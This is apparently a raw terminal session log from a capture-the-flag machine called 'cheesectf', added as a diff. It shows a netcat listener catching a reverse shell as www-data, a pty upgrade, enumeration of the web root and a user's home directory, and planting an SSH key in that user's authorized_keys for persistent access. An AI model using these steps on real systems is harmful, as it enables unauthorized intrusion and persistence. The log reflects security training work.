@@ -1,0 +1,85 @@
+Script started on 2025-01-22 19:43:38+03:00 [COMMAND="nc -lnvp 1337" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+listening on [any] 1337 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 11573
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;[t  pty.spawn("/bin/bash")'
+www-data@cheesectf:/var/www/html$ ls
+ls
+adminpanel.css	login.css      orders.html	  supersecretadminpanel.html
+images		login.php      secret-script.php  supersecretmessageforadmin
+index.html	messages.html  style.css	  users.html
+www-data@cheesectf:/var/www/html$ cd ..
+cd ..
+www-data@cheesectf:/var/www$ ls
+ls
+html
+www-data@cheesectf:/var/www$ cd ..
+cd ..
+www-data@cheesectf:/var$ ls
+ls
+backups  crash	local  log   opt  snap	 tmp
+cache	 lib	lock   mail  run  spool  www
+www-data@cheesectf:/var$ cd www
+cd www
+ls
+www-data@cheesectf:/var/www$ ls
+html
+www-data@cheesectf:/var/www$ cd html
+cd html
+www-data@cheesectf:/var/www/html$ ls
+ls
+adminpanel.css	login.css      orders.html	  supersecretadminpanel.html
+images		login.php      secret-script.php  supersecretmessageforadmin
+index.html	messages.html  style.css	  users.html
+www-data@cheesectf:/var/www/html$ cat supersecretmessageforadmin
+cat supersecretmessageforadmin
+If you know, you know :D
+www-data@cheesectf:/var/www/html$ cd /home
+cd /home
+www-data@cheesectf:/home$ ls
+ls
+comte
+www-data@cheesectf:/home$ cd cm omte
+cd comte
+www-data@cheesectf:/home/comte$ ls
+ls
+snap  user.txt
+www-data@cheesectf:/home/comte$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@cheesectf:/home/comte$ ls
+ls
+snap  user.txt
+www-data@cheesectf:/home/comte$ ls -al
+ls -al
+total 52
+drwxr-xr-x 7 comte comte 4096 Apr  4  2024 .
+drwxr-xr-x 3 root  root  4096 Sep 27  2023 ..
+-rw------- 1 comte comte   55 Apr  4  2024 .Xauthority
+lrwxrwxrwx 1 comte comte    9 Apr  4  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 comte comte  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 comte comte 3771 Feb 25  2020 .bashrc
+drwx------ 2 comte comte 4096 Sep 27  2023 .cache
+drwx------ 3 comte comte 4096 Mar 25  2024 .gnupg
+drwxrwxr-x 3 comte comte 4096 Mar 25  2024 .local
+-rw-r--r-- 1 comte comte  807 Feb 25  2020 .profile
+drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
+-rw-r--r-- 1 comte comte    0 Sep 27  2023 .sudo_as_admin_successful
+drwx------ 3 comte comte 4096 Mar 25  2024 snap
+-rw------- 1 comte comte 4276 Sep 15  2023 user.txt
+www-data@cheesectf:/home/comte$ cd .ssh
+cd .ssh
+www-data@cheesectf:/home/comte/.ssh$ ls
+ls
+authorized_keys
+www-data@cheesectf:/home/comte/.ssh$ echo ""^[[D      "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux" > authorized_keys                > authorized_keys
+<psqPdAUUP3sY4J63p1I h471x@winux" >> authorized_keys
+www-data@cheesectf:/home/comte/.ssh$ cat au	thorized_keys
+cat authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/vVwPbH6N1nv0VCowa7vjxhpsqPdAUUP3sY4J63p1I h471x@winux
+www-data@cheesectf:/home/comte/.ssh$ exit
+exit
+exit
+$ exit
+
+Script done on 2025-01-22 20:13:16+03:00 [COMMAND_EXIT_CODE="0"]
